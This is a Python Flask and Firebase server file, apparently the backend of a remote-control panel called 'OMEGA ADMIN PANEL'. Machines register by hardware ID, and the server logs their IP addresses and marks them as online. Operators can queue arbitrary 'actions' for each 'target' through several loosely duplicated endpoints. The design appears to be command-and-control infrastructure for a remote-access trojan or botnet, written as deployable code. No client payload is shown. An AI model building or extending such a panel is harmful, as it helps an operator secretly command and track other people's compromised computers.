import os
import json
from flask import Flask, render_template, request, jsonify
import firebase_admin
from firebase_admin import credentials, db

app = Flask(__name__)

# ============================================================
# FIREBASE INITIALIZATION
# ============================================================

if not firebase_admin._apps:
    firebase_config_str = os.environ.get("FIREBASE_CONFIG_JSON")

    if not firebase_config_str:
        raise ValueError(
            "CRITICAL: FIREBASE_CONFIG_JSON environment variable is missing!"
        )

    try:
        cred_dict = json.loads(firebase_config_str)
        cred = credentials.Certificate(cred_dict)

        firebase_admin.initialize_app(
            cred,
            {
                "databaseURL":
                    "https://vipchaetos-default-rtdb.firebaseio.com/"
            }
        )

    except Exception as e:
        raise ValueError(
            f"CRITICAL: Firebase initialization failed: {e}"
        )


# ============================================================
# MAIN PANEL
# ============================================================

@app.route("/", methods=["GET"])
def index():
    return render_template("index.html")


# ============================================================
# HEALTH CHECK
# ============================================================

@app.route("/health", methods=["GET"])
def health():
    return jsonify({
        "status": "ok",
        "service": "OMEGA ADMIN PANEL"
    }), 200


# ============================================================
# HEARTBEAT
# ============================================================

@app.route("/api/heartbeat", methods=["POST"])
def heartbeat():

    try:
        data = request.get_json(silent=True)

        if not data:
            data = request.form.to_dict()

        hwid = data.get("hwid")

        if not hwid:
            return jsonify({
                "status": "error",
                "message": "Missing HWID"
            }), 400

        ip_addr = request.headers.get(
            "X-Forwarded-For",
            request.remote_addr
        )

        if ip_addr and "," in ip_addr:
            ip_addr = ip_addr.split(",")[0].strip()

        ref = db.reference(f"clients/{hwid}")

        ref.update({
            "ip": ip_addr,
            "status": "ONLINE",
            "last_seen": "Active Live"
        })

        return jsonify({
            "status": "registered",
            "assigned_hwid": hwid
        }), 200

    except Exception as e:

        return jsonify({
            "status": "error",
            "message": str(e)
        }), 500


# ============================================================
# TARGET ACTION
# ============================================================

def process_target_action():

    try:

        data = request.get_json(silent=True)

        if not data:
            data = request.form.to_dict()

        hwid = data.get("hwid")
        action = data.get("action")

        if not hwid:
            return jsonify({
                "status": "error",
                "message": "Missing HWID"
            }), 400

        if not action:
            return jsonify({
                "status": "error",
                "message": "Missing action"
            }), 400

        # Convert values to strings safely
        hwid = str(hwid).strip()
        action = str(action).strip()

        if not hwid or not action:
            return jsonify({
                "status": "error",
                "message": "Invalid HWID or action"
            }), 400

        # Firebase path
        ref = db.reference(
            f"clients/{hwid}/pending_action"
        )

        ref.set(action)

        return jsonify({
            "status": "success",
            "message":
                f"Action '{action}' successfully queued for {hwid}",
            "hwid": hwid,
            "action": action
        }), 200

    except Exception as e:

        return jsonify({
            "status": "error",
            "message": str(e)
        }), 500


# ============================================================
# TARGET ACTION ROUTES
# ============================================================

@app.route(
    "/api/target-action",
    methods=["GET", "POST", "OPTIONS"]
)
@app.route(
    "/api/target-action/",
    methods=["GET", "POST", "OPTIONS"]
)
@app.route(
    "/target-action",
    methods=["GET", "POST", "OPTIONS"]
)
@app.route(
    "/target-action/",
    methods=["GET", "POST", "OPTIONS"]
)
@app.route(
    "/api/action",
    methods=["GET", "POST", "OPTIONS"]
)
@app.route(
    "/api/action/",
    methods=["GET", "POST", "OPTIONS"]
)
@app.route(
    "/action",
    methods=["GET", "POST", "OPTIONS"]
)
@app.route(
    "/action/",
    methods=["GET", "POST", "OPTIONS"]
)
def target_action():

    # Browser preflight
    if request.method == "OPTIONS":
        return jsonify({
            "status": "ok"
        }), 200

    return process_target_action()


# ============================================================
# DEBUG: SHOW REGISTERED ROUTES
# ============================================================

@app.route("/api/routes", methods=["GET"])
def show_routes():

    routes = []

    for rule in app.url_map.iter_rules():
        routes.append({
            "route": str(rule),
            "methods": sorted(
                list(rule.methods - {"HEAD", "OPTIONS"})
            )
        })

    return jsonify({
        "status": "ok",
        "routes": routes
    })


# ============================================================
# START SERVER
# ============================================================

if __name__ == "__main__":

    port = int(os.environ.get("PORT", 5000))

    app.run(
        host="0.0.0.0",
        port=port
    )